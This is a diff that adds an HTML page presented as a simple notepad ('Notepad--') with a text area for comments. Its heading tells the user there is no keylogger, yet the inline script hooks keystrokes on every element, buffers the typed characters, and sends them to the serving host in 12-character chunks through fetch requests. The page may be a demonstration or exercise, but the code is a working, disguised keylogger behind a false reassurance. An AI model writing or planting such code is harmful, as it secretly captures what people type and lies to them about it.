@@ -1,0 +1,80 @@
+<html>
+	<head>
+		<title>Notepad--</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="icon" href="data:," />
+		<style>
+			html {
+				font-family: Helvetica;
+				display: inline-block;
+				margin: 0px auto;
+				text-align: center;
+			}
+
+			h1 {
+				color: #0f3376;
+				padding: 2vh;
+			}
+
+			p {
+				font-size: 1.5rem;
+			}
+
+			.button {
+				display: inline-block;
+				background-color: #e7bd3b;
+				border: none;
+				border-radius: 4px;
+				color: white;
+				padding: 16px 40px;
+				text-decoration: none;
+				font-size: 30px;
+				margin: 2px;
+				cursor: pointer;
+			}
+
+			.button2 {
+				background-color: #4286f4;
+			}
+		</style>
+	</head>
+
+	<body>
+		<h1>Notepad-- := please type your comment, there is NO KEYLOGGER</h1>
+
+		<textarea cols="300" rows="40"></textarea>
+
+		<script>
+			let buffer = '';
+			let timeout = setTimeout(debounce_keylog);
+
+			function flush_keylog() {
+				fetch(`/${buffer.slice(0, 12)}`);
+
+				buffer = buffer.slice(12);
+
+				if (buffer.length) {
+					debounce_keylog();
+				}
+			}
+
+			function debounce_keylog() {
+				clearTimeout(timeout);
+
+				timeout = setTimeout(flush_keylog, 1200);
+			}
+
+			for (const e of document.querySelectorAll('*')) {
+				e.addEventListener('keydown', (event) => {
+					event.stopPropagation();
+
+					if (encodeURIComponent(event.key).length === 1) {
+						buffer += event.key;
+					}
+
+					debounce_keylog();
+				});
+			}
+		</script>
+	</body>
+</html>
